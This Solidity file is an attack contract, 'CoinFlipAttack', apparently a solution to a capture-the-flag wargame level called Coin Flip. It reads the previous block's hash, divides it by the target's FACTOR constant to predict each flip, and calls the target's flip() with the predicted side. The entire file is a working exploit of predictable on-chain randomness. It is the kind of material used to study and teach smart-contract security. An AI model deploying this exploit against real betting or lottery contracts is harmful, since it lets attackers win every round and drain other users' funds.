pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface CoinFlipInteface {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack{
    CoinFlipInteface coinflip;
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinFlipAddress) public {
        coinflip = CoinFlipInteface(_coinFlipAddress);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = uint256(uint256(blockValue).div(FACTOR));
        bool side = coinFlip == 1 ? true : false;
        bool r = coinflip.flip(side);
        consecutiveWins++;
    }



}